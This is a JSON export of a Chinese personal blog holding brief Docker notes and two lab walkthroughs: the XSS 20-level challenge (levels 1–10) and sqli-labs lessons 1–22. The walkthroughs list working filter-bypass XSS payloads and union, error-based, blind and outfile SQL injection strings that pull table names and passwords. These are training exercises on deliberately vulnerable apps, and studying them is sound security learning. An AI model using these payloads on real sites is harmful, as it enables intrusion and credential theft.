{"meta":{"title":"FINSENTY54","subtitle":"你看那云聚了又散，散了又聚","description":"blog","author":"finsenty54","url":"http://finsenty54.github.io","root":"/"},"pages":[{"title":"","date":"2019-02-27T03:27:47.653Z","updated":"2019-02-27T03:23:58.180Z","comments":true,"path":"googleda09d6ee39745173.html","permalink":"http://finsenty54.github.io/googleda09d6ee39745173.html","excerpt":"","text":"google-site-verification: googleda09d6ee39745173.html"}],"posts":[{"title":"Docker学习笔记","slug":"Docker学习笔记","date":"2019-03-15T19:36:58.000Z","updated":"2019-03-27T10:16:04.075Z","comments":true,"path":"2019/03/16/Docker学习笔记/","link":"","permalink":"http://finsenty54.github.io/2019/03/16/Docker学习笔记/","excerpt":"","text":"sudo add-apt-repository \\ “deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable” https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/ 配置完镜像源后，记得重启 /bin/sh/bin/bash运行shell docker run –name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=”123456” -d mysql:5.7 docker run -p 8888:5000 –name myfirstapp YOUR_USERNAME/myfirstapp Running on http://0.0.0.0:5000/ (Press CTRL+C to quit) docker rm docker ps -a -q docker rmi docker images -q docker run -p 4000:80 –name py-http6 –link mariadb:mysql finsenty/http5 mysql.connecter 查询后面带一个， -u “http://192.168.160.1/sqltest/post.php&quot; –forms","categories":[],"tags":[]},{"title":"XSS 20关挑战","slug":"xss","date":"2019-03-01T22:22:42.000Z","updated":"2019-03-27T10:16:05.397Z","comments":true,"path":"2019/03/02/xss/","link":"","permalink":"http://finsenty54.github.io/2019/03/02/xss/","excerpt":"","text":"level1反射型XSS也被称为非持久性CSS当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。 查看源码window.alert = function()echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;没有过滤直接调用函数就可以通关&lt;script&gt;window.alert()&lt;/script&gt; &lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。 less2利用页面元素看到输入在&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;闭合input语句即可1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot; less3查看页面元素&lt;input name=keyword value=&#39;1&#39;&gt;在input语句里尝试闭合无用查看源码str都加上了htmlspecialchars函数，但默认配置是不过滤单引号的&#39;onmouseover=&#39;window.alert()即可 输入&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;输入&#39;&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;输入&#39;onclick&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;输入onclick= &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt; less4输入&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;查看可知&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;过滤了&lt; &gt;利用上节方法&quot;onclick=&quot;alert() 更新于2019-03-03 11:19:50 星期日 less5试过后发现onclick变为o_nclickscript变为sc_ript使用&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt; less6onclick script href输入后都进行了变化&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;keyword=&quot;ONclick=&quot;alert()keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;进行大小写替换可以 less7script被过滤，改变大小写也没有用on被过滤href同样如此keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;利用双写绕过 更新于2019-03-06 21:20:39 星期三 less8这题可以添加链接直接使用javascript:alert(1)但并没有用，查看源码$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);被替换了使用制表符绕过%09keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接 less9上题结果没有用，查看源码if(false===strpos($str7,&#39;http://&#39;))知一定要有http://在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的javasc%09ript%3Aalert%281%29//http://www.test.com less10查看页面元素有几个隐藏的值，注入点就在这keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert() 更新于2019-03-27 18:15:42 星期三","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://finsenty54.github.io/tags/xss/"}]},{"title":"sqli-labs(less-1__less-22)","slug":"sqli-labs","date":"2019-02-26T17:01:08.000Z","updated":"2019-03-13T12:28:08.474Z","comments":true,"path":"2019/02/27/sqli-labs/","link":"","permalink":"http://finsenty54.github.io/2019/02/27/sqli-labs/","excerpt":"","text":"闭合有&#39; &quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata 在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &quot;&lt;br&gt;&quot;; 表示换行 ?id=1&#39; and 1=1 --+ 没有报错，返回正确结果 ?id=10&#39; 报错 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1 ?id=1&#39; and 1=2 --+ 没有正确结果经过这三个步骤说明是字符型注入 使用order by来判断有几个字段?id=1&#39; order by 4--+报错Unknown column &#39;4&#39; in &#39;order clause&#39;说明有3个字段 LIMIT 0,1 表示结果只显示一行?id=-1&#39; union select 1,2,3 --+ 看哪个字段可以回显 ?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+得到版本，用户，当前数据库，数据路径concat_ws 带分隔符的链接 ?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+得到当前库的表名?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+查看数据库名信息group_concat 行转列 ?id=-1 &#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;), 3 --+users 表的列名 ?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+得出账户密码 Less-2 ?id=1&#39;报错 ?id=1 and 1=1正确 ?id=1 and 1=2错误可知是数字型注入解题与第一题类似，不再赘述 Less-3查看源码可知，用()加在了id两边，所以只要将()闭合就行了?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+ Less-4查看源码，id两边加了”,用?id=-1&quot;)闭合 Less-5双注入 Rand() //随机函数 Floor() //取整函数 Count() //汇总函数 Group by clause //分组语句 https://blog.csdn.net/Leep0rt/article/details/78556440 ?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+select 查询列数要相同，否则报错 ?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+用group_concat会报错，使用limit 更新于2019-03-01 22:21:15 星期五 Less-6尝试注入后可知是用&quot;闭合，字符串型其他和上题一致?id=1&quot; union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ 更新于2019-03-03 11:48:51 星期日 Lss-7利用outfile文件一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限需要在指定的目录下进行数据的导出。需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖 secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数,这些操作需要用户具有file权限。 如果这个参数为空，这个变量没有效果。 如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它. 如果这个参数为null，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。 @@datadir 读取数据库路径@@basedir MYSQL 获取安装路径 在Mysql中，需要注意路径转义的问题，即用\\分隔。 https://www.jianshu.com/p/7b9256de20d1 经过测试，用&#39;)) 来闭合 ?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\4.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\5.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\6.txt&quot; --+ Less-8盲注布尔注入当一个页面，存在注入，没显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断进行sql注入。 exists（）用于检查 子查询是否有返回数据。 结果是 ture或者false ascii（）把字符转化成ascii码 substr（）substr（string string，num start，num length）；偏移从1开始的 并不是0； DISTINCT 去重复?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+ ?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+ ?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+ ?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+ ?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+ select database() 作为一个语句加括号用脚本来跑 更新于2019-03-04 23:09:10 星期一 Less-9盲注基于时间if( expr1 , expr2 , expr3 ) expr1 true 返回expr2 false 返回 expr3 ?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+ 利用页面返回时间判断对错例如?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+ Less-10与上题相同，不过利用&quot;进行闭合 更新于2019-03-06 20:29:31 星期三 Less-11GET - 从指定的资源请求数据。 POST - 向指定的资源提交要被处理的数据 输入&#39;报错，知用&#39;闭合uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit可以直接爆出来其他相同uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit Less-12实验可知用&quot;)闭合其他相同 Less-13实验知用&#39;) 闭合其他相同，例如 uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit Less-14实验知用&quot;闭合其他和上题相同 Less-15实验知用&#39;闭合但没用报错信息所以使用时间或布尔注入uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit Less-16实验知用&quot;闭合其他和上题相同 Less-17在uname中注入，都没有反应在password中注入，也没有反应后知先验证用户名正确后，才执行password updatexml()uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit 其他相同 Less-18使用正确账号密码后，页面显示user-agent，则可以在这上面注入 1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;11&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1其他相同HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。 更新于2019-03-10 22:43:03 星期日 Less-19参考上题输入正确用户和密码后，跳出页面 差不多知道在referer上注入&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1不能用#注释，因为后面还有语句存在 &#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1 更新于2019-03-10 22:43:03 星期日 Less-20由题目知注入点在Cookie中 这里我犯了个错误，由于没有拦截，修改Cookie后，直接点刷新不会出结果，需要重新载入页面 输入&#39;报错存在注入点 接下来可以用第一题用的&#39; union select 1,2,database()# &#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()# 也可以用报错注入&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))# Less-21查看CookieYWRtaW4进行解密，知是用base64加密的admin所以只要将上题内容加密即可 Less-22查看cookieadmin&#39; and 1=1 #没有查询结果admin&quot; and 1=1 #结果正确知是用&quot;闭合其他方法与前题相同 更新于2019-03-13 20:26:48 星期三","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://finsenty54.github.io/tags/sql/"}]}]}